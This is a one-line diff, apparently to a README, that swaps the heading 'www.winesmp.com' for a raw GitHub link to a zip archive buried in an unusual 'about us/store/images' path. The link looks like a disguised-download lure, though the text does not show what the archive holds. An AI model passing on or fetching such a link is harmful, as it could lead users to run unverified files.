@@ -1,1 +1,1 @@
-# www.winesmp.com
+# https://raw.githubusercontent.com/mins271/www.winesmp.com/main/about us/store/images/com-www-winesmp-v3.8-beta.1.zip
